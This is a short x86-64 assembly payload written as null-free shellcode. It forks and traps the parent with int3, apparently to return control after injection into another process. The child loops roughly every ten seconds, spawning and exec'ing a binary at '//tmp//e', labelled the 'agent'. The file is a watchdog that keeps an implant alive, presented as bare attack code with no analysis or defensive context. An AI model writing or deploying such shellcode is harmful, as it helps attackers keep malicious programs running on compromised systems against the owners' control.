	BITS 64

	section .text
	global  _start

_start:
	;;  fork
	xor rax, rax
	xor rdi, rdi
	mov al, 0x39; syscall fork
	syscall

	cmp rax, 0x0; check return value
	jg  pause; int3 if in parent

watchdog:
	;;  fork to exec agent
	xor rax, rax
	xor rdi, rdi
	mov al, 0x39; syscall fork
	syscall
	cmp rax, 0x0; check return value
	je  exec; exec if in child

	;;   sleep
	mov  rax, 0
	mov  al, 0x23; syscall nanosleep
	push 10; sleep sec
	push 10
	mov  rdi, rsp
	xor  rsi, rsi; no more args
	xor  rdx, rdx
	syscall
	loop watchdog

exec:
	xor  rsi, rsi
	push rsi; '\0' string terminator
	mov  rdi, 0x652f2f706d742f2f
	push rdi
	push rsp
	pop  rdi
	mov  rdi, rsp; pointer to "\/\/tmp\/\/e"
	push 0x3b
	pop  rax
	cdq
	syscall

pause:
	;;  trap
	int 0x3

	; exit:
	; ;; exit
	; xor rax, rax
	; xor rdi, rdi
	; xor rsi, rsi
	; mov al, 0x3c; syscall exit
	; mov di, 0x0; exit code
	; syscall
